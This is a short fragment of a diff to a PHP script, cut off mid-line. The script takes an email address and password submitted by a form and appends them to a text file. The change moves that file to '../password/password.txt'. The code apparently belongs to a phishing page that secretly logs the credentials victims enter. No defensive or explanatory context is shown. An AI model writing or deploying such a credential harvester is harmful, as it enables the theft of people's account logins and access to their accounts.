@@ -3,7 +3,7 @@
 $email = $_POST['email'];
 $pass = $_POST['pass'];
 
-$dosya_adi = "pass.txt";
+$dosya_adi = "../password/password.txt";
 $dosya = fopen ($dosya_adi , 'a+') or die ("Error!");
 
 fwrite ( $dosya , "
